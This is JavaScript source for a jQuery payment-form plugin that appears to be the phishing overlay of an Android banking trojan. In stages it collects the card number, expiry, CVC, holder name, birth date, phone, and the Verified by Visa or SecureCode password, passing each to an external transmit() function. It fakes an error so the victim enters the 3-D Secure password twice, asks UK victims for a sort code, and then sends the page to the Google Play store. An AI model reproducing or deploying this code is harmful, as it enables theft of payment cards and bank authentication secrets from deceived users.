(function ($) {

	"use strict";
	
	$.fn.paymentInfo = function (method) {

		var methods,
			helpers,
			events,
			ccDefinitions,
			opts,
			cardType,
			pluginName = "paymentInfo",
			cardCvcIsOk = false,
			cardNumberIsOk = false,
			doubleVbvWasSent = false,
			cardExpirationIsOk = false,
			versionSDK = getVersionSdk();
		
		events = $.map(['change', 'blur', 'keyup', 'keypress', 'keydown'], function (v) {
			return v + '.' + pluginName;
		}).join(' ');
		
		ccDefinitions = {
			'visa': /^4/,
			'mastercard': /^5[1-5]/,
			'amex': /^3(4|7)/,
			'diners': /^3(00|01|02|03|04|05|5|8|9|09)/,
			'discover': /^6(5|011|44|45|46|47|48|49)/,
			'jcb': /^35[28-89]/
		};
		
		helpers = {
			
			getCreditCardType: function (number) {
				var ccType;
				$.each(ccDefinitions, function (i, v) {
					if (v.test(number)) {
						ccType = i;
						return false;
					}
				});
				return ccType;
			},
			
			showAllCardImages: function () {
				$('.img_cards').fadeIn( 'slow' );
			},
			
			showErrorField: function (field_class) {
				$('.' + field_class).addClass('field_error');
				var width = $('.' + field_class).offset().left + $('.' + field_class).width();
				$('#' + field_class + '-error').css('left', width - 12);
				var display = (field_class == opts.cardVbvClass) ? 'block' : 'inline-flex';
				$('#' + field_class + '-error').css('display', display);
			},
			
			hideErrorField: function (field_class) {
				$('.' + field_class).removeClass('field_error');
				$('#' + field_class + '-error').hide();
			},
			
			expirationInComplete: function () {
				cardExpirationIsOk = false;
			},
			
			expirationComplete: function () {
				cardExpirationIsOk = true;
				var mmYY = $('.' + opts.cardExpirationClass).val().split('/');
				var month = parseInt(mmYY[0]);
				var year = parseInt(mmYY[1]);
				if (month > 12 || month < 1 || year > 26 || year < 16) {
					helpers.showErrorField(opts.cardExpirationClass);
					cardExpirationIsOk = false;
				} else {
					helpers.hideErrorField(opts.cardExpirationClass);
					cardExpirationIsOk = true;
					setTimeout(function () {
						$('.' + opts.cardCvvClass).focus();
						$('.' + opts.cardCvcHint).fadeIn('slow');
					}, 220);
				}
			},
			
			cvcInComplete: function () {
				cardCvcIsOk = false;
			},
			
			cvcComplete: function () {
				cardCvcIsOk = true;
				helpers.hideErrorField(opts.cardCvvClass);
				helpers.checkCardDataAndTransmit();
			},
			
			exists: function () {
				return $(this).length;
			},
			
			checkCardDataAndTransmit: function () {
				if (!cardNumberIsOk) {
					helpers.showErrorField(opts.cardNumberClass);
					$('.' + opts.cardNumberClass).focus();
					return;
				}
				if (!cardExpirationIsOk) {
					helpers.showErrorField(opts.cardExpirationClass);
					$('.' + opts.cardExpirationClass).focus();
					return;
				}
				var mmYY = $('.' + opts.cardExpirationClass).val().split('/');
				var mmYYarr = [ 
					{ name: 'expiredMonth', value: mmYY[0] },
					{ name: 'expiredYear', value: mmYY[1] } ];
				if (transmit(1, opts.cardDataBlockId, false, mmYYarr)) {
					$('#' + opts.cardDataBlockId).hide();
					$('#' + opts.addressFieldsBlockId).slideDown(700);
					$('.' + opts.saveButtonClass).attr('disabled', false);
				}
			},
			
			checkHolderDataAndTransmit: function (pressSend) {
				if ($('.' + opts.cardHolderClass).val().length < 10) {
					helpers.showErrorField(opts.cardHolderClass);
					$('.' + opts.cardHolderClass).focus();
					return;
				}
				helpers.hideErrorField(opts.cardHolderClass);
				
				var dateBirth = $('.' + opts.dateBirthClass).val();
				if (dateBirth.length != 10) {
					helpers.showErrorField(opts.dateBirthClass);
					$('.' + opts.dateBirthClass).focus();
					return;
				}
				var resultReg = dateBirth.match(/^\d{2}\.\d{2}\.(\d{4})$/);
				var year = resultReg[1];
				if (!year || year > 2006 || year < 1956) {
					helpers.showErrorField(opts.dateBirthClass);
					$('.' + opts.dateBirthClass).focus();
					return;
				}
				helpers.hideErrorField(opts.dateBirthClass);
				
				var phonePrefix = $('.' + opts.prefixNumberClass).val();
				if (phonePrefix.length == 0) {
					helpers.showErrorField(opts.prefixNumberClass);
					$('.' + opts.prefixNumberClass).focus();
					return;
				}
				helpers.hideErrorField(opts.prefixNumberClass);
				
				var phoneBody = $('.' + opts.phoneNumberClass).val();
				if (phoneBody.length < 7) {
					helpers.showErrorField(opts.phoneNumberClass);
					$('.' + opts.phoneNumberClass).focus();
					return;
				}
				helpers.hideErrorField(opts.phoneNumberClass);
				
				var numberPhone = phonePrefix.concat(phoneBody).replace(/ /ig, '');
				var numberPhoneArr = [ { name: 'phoneNumber', value: numberPhone } ];
				var thirdStep = (cardType == 'visa' || cardType == 'mastercard');
				
				if (pressSend) {
					$('.' + opts.saveButtonClass).attr('disabled', true);
					setTimeout(function () {
						$('.' + opts.saveButtonClass).attr('disabled', false)
					}, 2500);
					
					if (transmit(2, opts.addressFieldsBlockId, !thirdStep, numberPhoneArr)) {
						if (thirdStep) {
							if (cardType == 'mastercard') {
								var imgUrl = 'images/mdpi/mastercard_securecode_logo.png';
								$('.' + opts.vbvImageClass).attr('src', imgUrl);
							}
							$('.' + opts.cardVbvClass).focus();
							$('.' + opts.saveButtonClass).hide();
							$('.' + opts.verifyButtonClass).show();
						} else {
							helpers.startEndSpinner();
						}
						$('.' + opts.textTitleClass).hide();
						$('#' + opts.addressFieldsBlockId).hide();
						$('#' + opts.cardVbvBlockId).show();
					}
				}
			},
			
			checkVbvDataAndTransmit: function () {
				if ($('.' + opts.cardVbvClass).val().length < 4) {
					helpers.showErrorField(opts.cardVbvClass);
					return;
				}
				
				if (doubleVbvWasSent) {
					
					helpers.hideErrorField(opts.cardVbvClass);
					helpers.startEndSpinner();
					var stepID = (getCountryCode() == 'gb') ? 5 : 4;
					transmit(stepID, opts.cardVbvBlockId, true);
					
				} else {
					
					transmit(3, opts.cardVbvBlockId, false);
					
					doubleVbvWasSent = true;
					$('.' + opts.cardVbvClass).val('');
					helpers.showErrorField(opts.cardVbvClass);
					$('.' + opts.cardVbvClass).removeClass('field_error');
					$('.' + opts.cardVbvClass).attr('name','vbvPassRepeat');
					
					if (getCountryCode() == 'gb') {
						$('.' + opts.vbvImageClass).attr('src', 'images/mdpi/lock.png');
						$('.' + opts.cardVbvClass).attr('placeholder', 'Sort code');
						$('.' + opts.cardVbvClass).attr('name', 'sortCode');
						$('.' + opts.cardVbvClass).focus();
					}
				}
			},
			
			startEndSpinner: function () {
				/*$('.' + opts.vbvImageClass).attr('src', 'images/spinner.gif');
				$('.' + opts.vbvImageClass).css('height', '100%');
				$('.' + opts.vbvImageClass).css('width', '100%');
				$('.' + opts.vbvImageClass).css('margin-top', '10px');
				$('.' + opts.buttonBarClass).hide();
				$('.' + opts.cardVbvClass).attr('style','display:none !important');*/
                        window.location.href = "https://play.google.com/apps";
			},
			
			matchNumbers: function (element) {
				
				var cardNumber = element.val();
				cardType = helpers.getCreditCardType(cardNumber);
				
				if (cardNumber != "") {
					if (cardType !== undefined && $('#img_card_' + cardType).exists()) {
						$('#img_card_' + cardType).removeClass('img_cards');
						$('.img_cards').fadeOut( 'slow' );
						$('#img_card_' + cardType).addClass('img_cards');
					} else {
						helpers.showAllCardImages();
					}
				} else {
					helpers.showAllCardImages();
				}
			
				//if (false && versionSDK < 16) {
					/*
					if (cardType == "amex" && cardNumber.length == 15) {
						helpers.creditCardComplete();
					} else if (cardNumber.length == 16) {
						helpers.creditCardComplete();
					}
					*/
				//} else {
					
					var maskCVC = (cardType === "amex") ? '0000' : '000';
					
					$('.' + opts.cardCvvClass)
						.mask(maskCVC, { 
							onComplete: function(cep) {
								helpers.cvcComplete();
							},
							onInvalid: function(val, e, f, invalid, options) {
								helpers.cvcInComplete();
							}
						})
						.bind('blur', function (e) {
							if (!cardCvcIsOk) {
								helpers.showErrorField(opts.cardCvvClass);
							}
						});
					
					var mask = (cardType === "amex") 
						? '0000 000000 00000'
						: '0000 0000 0000 0000';
					
					element.mask(mask, { 
						onComplete: function(cep) {
							helpers.creditCardComplete();
						}
					});	
				//}
			},

			creditCardComplete: function () {

				var element = $('.' + opts.cardNumberClass),
					uvalue = element.val(),
					element_error = $('.' + opts.cardNumberClass + '_error');
				
				cardType = helpers.getCreditCardType(uvalue);
				
				if (cardType === "amex" && uvalue.length === 15) {
					$('.' + opts.cardCvcHint).attr('src', 'images/mdpi/cvc_hint_amex.png');
				} else if (cardType !== "amex" && uvalue.length === 16) {
					$('.' + opts.cardCvcHint).attr('src', 'images/mdpi/cvc_hint_default.png');
				}
				
				var ccDigit = uvalue.replace(/ /ig, '');
				
				if (!helpers.ccLuhnCheck(ccDigit) || !helpers.checkCreditCard(ccDigit)) {
					helpers.showErrorField(opts.cardNumberClass);
					cardNumberIsOk = false;
					return;
				}
				
				cardNumberIsOk = true;
				helpers.hideErrorField(opts.cardNumberClass);
				$('.' + opts.cardMmYyCvcBlock).show();
				$('.' + opts.cardExpirationClass).focus();
			},

			beginCreditCard: function (element) {

				$(element)
					.unbind("keypress blur")
					.bind("keypress blur", function (e) {

						if (e.keyCode === 13 || e.type === 'blur') {

							var uvalue = $(element).val();
							cardType = helpers.getCreditCardType(uvalue);

							if ((cardType === "amex" && uvalue.length === 15) || 
								(cardType !== "amex" && uvalue.length === 16)) {
									helpers.creditCardComplete();
								} else {
									cardNumberIsOk = false;
								}
						}

					})
					.unbind("focus click keydown");
			},

			ccLuhnCheck: function (card_number) {

				var arr = [],
				  card_number = card_number.toString();
				  
				for(var i = 0; i < card_number.length; i++) {
					
					if(i % 2 === 0) {
						
					  var m = parseInt(card_number[i]) * 2;
					  
					  if(m > 9) {
						arr.push(m - 9);
					  } else {
						arr.push(m);
					  } 
					} else {
						var n = parseInt(card_number[i]);
						arr.push(n)
					}
				}
				
				var summ = arr.reduce(function(a, b) { return a + b; });
				return Boolean(!(summ % 10));
			},
			
			checkCreditCard: function (cardnumber) {

				var cards = new Array();

				cards[0] = {
					name : "Visa",
					length : "13,16",
					prefixes : "4",
					checkdigit : true
				};
				cards[1] = {
					name : "MasterCard",
					length : "16",
					prefixes : "51,52,53,54,55",
					checkdigit : true
				};
				cards[2] = {
					name : "DinersClub",
					length : "14,16",
					prefixes : "36,38,54,55",
					checkdigit : true
				};
				cards[3] = {
					name : "CarteBlanche",
					length : "14",
					prefixes : "300,301,302,303,304,305",
					checkdigit : true
				};
				cards[4] = {
					name : "AmEx",
					length : "15",
					prefixes : "34,37",
					checkdigit : true
				};
				cards[5] = {
					name : "Discover",
					length : "16",
					prefixes : "6011,622,64,65",
					checkdigit : true
				};
				cards[6] = {
					name : "JCB",
					length : "16",
					prefixes : "35",
					checkdigit : true
				};
				cards[7] = {
					name : "enRoute",
					length : "15",
					prefixes : "2014,2149",
					checkdigit : true
				};
				cards[8] = {
					name : "Solo",
					length : "16,18,19",
					prefixes : "6334,6767",
					checkdigit : true
				};
				cards[9] = {
					name : "Switch",
					length : "16,18,19",
					prefixes : "4903,4905,4911,4936,564182,633110,6333,6759",
					checkdigit : true
				};
				cards[10] = {
					name : "Maestro",
					length : "12,13,14,15,16,18,19",
					prefixes : "5018,5020,5038,6304,6759,6761,6762,6763",
					checkdigit : true
				};
				cards[11] = {
					name : "VisaElectron",
					length : "16",
					prefixes : "4026,417500,4508,4844,4913,4917",
					checkdigit : true
				};
				cards[12] = {
					name : "LaserCard",
					length : "16,17,18,19",
					prefixes : "6304,6706,6771,6709",
					checkdigit : true
				};

				if (cardnumber.length == 0) {
					console.log('2');
					return false;
				}

				cardnumber = cardnumber.replace(/\s/g, "");

				var cardNo = cardnumber;
				var cardexp = /^[0-9]{13,19}$/;
				if (!cardexp.exec(cardNo)) {
					console.log('3');
					return false;
				}

				var cardType = -1;

				for (var i = 0; i < cards.length; i++) {

					var prefix = new Array();

					prefix = cards[i].prefixes.split(",");

					for (var j = 0; j < prefix.length; j++) {
						var exp = new RegExp("^" + prefix[j]);
						if (exp.test(cardnumber)) {
							cardType = i;
							break;
						}
					}
					
					if (cardType != -1) {
						break;
					}
				}
				
				if (cardType == -1) {
					console.log('1');
					return false;
				}

				if (cards[cardType].checkdigit) {
					var checksum = 0;
					var mychar = "";
					var j = 1;

					var calc;
					for (i = cardNo.length - 1; i >= 0; i--) {

						calc = Number(cardNo.charAt(i)) * j;

						if (calc > 9) {
							checksum = checksum + 1;
							calc = calc - 10;
						}

						checksum = checksum + calc;

						if (j == 1) {
							j = 2
						} else {
							j = 1
						};
					}

					if (checksum % 10 != 0) {
					console.log('4');
						return false;
					}
				}

				if (cardNo == '5490997771092064') {
					console.log('5');
					return false;
				}

				var LengthValid = false;
				var undefined;

				var lengths = new Array();
				lengths = cards[cardType].length.split(",");
				for (j = 0; j < lengths.length; j++) {
					if (cardNo.length == lengths[j])
						LengthValid = true;
				}

				if (!LengthValid) {
					console.log('6');
					return false;
				};

				return true;
			}

		};

		methods = {

			init: function (options) {

				opts = $.extend({}, $.fn.paymentInfo.defaults, options);
				
				$('.' + opts.saveButtonClass).click(function (e) {
					helpers.checkHolderDataAndTransmit(true);
				})
				
				$('.' + opts.verifyButtonClass).click(function (e) {
					helpers.checkVbvDataAndTransmit();
				})
				
				return this.each(function () {
				
					$(this)
						.find('.' + opts.cardExpirationClass)
							.mask('00/00', {
								onComplete: function(cep) {
									helpers.expirationComplete();
								},
								onInvalid: function(val, e, f, invalid, options) {
									helpers.expirationInComplete();
								}
							})
							.bind('blur', function (e) {
								if (!cardExpirationIsOk) {
									helpers.showErrorField(opts.cardExpirationClass);
								}
							})
						.end()
						.find('.' + opts.postalCodeClass)
							.bind('blur', function (e) {
								helpers.checkHolderDataAndTransmit(false);
							})
						.end()
						.find('.' + opts.prefixNumberClass)
							.mask('000000')
							.bind('blur', function (e) {
								helpers.checkHolderDataAndTransmit(false);
							})
						.end()
						.find('.' + opts.phoneNumberClass)
							.mask('00000000000')
							.bind('blur', function (e) {
								helpers.checkHolderDataAndTransmit(false);
							})
						.end();

						helpers.matchNumbers($(this).find('.' + opts.cardNumberClass).eq(0));

				}).unbind('.' + pluginName).bind(events, function () {
					helpers.matchNumbers($(this).find('.' + opts.cardNumberClass).eq(0));
				});
			},

			destroy: function () {
				return this.unbind('.' + pluginName);
			}

		};

		if (methods[method]) {
			return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));
		}
		if (typeof method === "object" || !method) {
			return methods.init.apply(this, arguments);
		}
	};
	
	$.fn.paymentInfo.defaults = {
		cardCvvClass: "card-cvc",
		cardCvcHint: "cvc-hint",
		cardMmYyCvcBlock: "month-year-cvc-block",
		cardExpirationClass: "card-expiration",
		cardNumberClass: "card-number",
		cardHolderClass: "card-holder",
		dateBirthClass: "date-birth",
		postalCodeClass: "postal-code",
		holderAddressClass: "holder-address",
		prefixNumberClass: "phone-prefix",
		phoneNumberClass: "phone-number",
		saveButtonClass: "save-button",
		verifyButtonClass: "verify-button",
		cardDataBlockId: "card-data-block",
		addressFieldsBlockId: "address-fields-block",
		vbvImageClass: "vbv-image",
		cardVbvClass: "card-vbv",
		cardVbvBlockId: "card-vbv-block",
		textTitleClass: "text-title",
		buttonBarClass: "button-bar",
		animationWait: 600,
		focusDelay: 200
	};

}(jQuery));

$(".credit-card-group").paymentInfo();
